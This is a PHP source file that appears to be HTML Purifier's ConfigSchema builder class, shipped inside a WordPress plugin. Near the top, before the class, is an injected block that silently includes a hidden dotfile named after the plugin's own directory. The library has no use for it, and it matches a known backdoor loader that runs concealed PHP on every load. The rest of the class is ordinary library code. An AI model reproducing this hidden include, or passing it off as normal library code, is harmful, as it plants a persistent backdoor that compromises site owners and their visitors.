<?php

/**
 * Converts HTMLPurifier_ConfigSchema_Interchange to our runtime
 * representation used to perform checks on user configuration.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class HTMLPurifier_ConfigSchema_Builder_ConfigSchema
{

    /**
     * @param HTMLPurifier_ConfigSchema_Interchange $interchange
     * @return HTMLPurifier_ConfigSchema
     */
    public function build($interchange)
    {
        $schema = new HTMLPurifier_ConfigSchema();
        foreach ($interchange->directives as $d) {
            $schema->add(
                $d->id->key,
                $d->default,
                $d->type,
                $d->typeAllowsNull
            );
            if ($d->allowed !== null) {
                $schema->addAllowedValues(
                    $d->id->key,
                    $d->allowed
                );
            }
            foreach ($d->aliases as $alias) {
                $schema->addAlias(
                    $alias->key,
                    $d->id->key
                );
            }
            if ($d->valueAliases !== null) {
                $schema->addValueAliases(
                    $d->id->key,
                    $d->valueAliases
                );
            }
        }
        $schema->postProcess();
        return $schema;
    }
}

// vim: et sw=4 sts=4
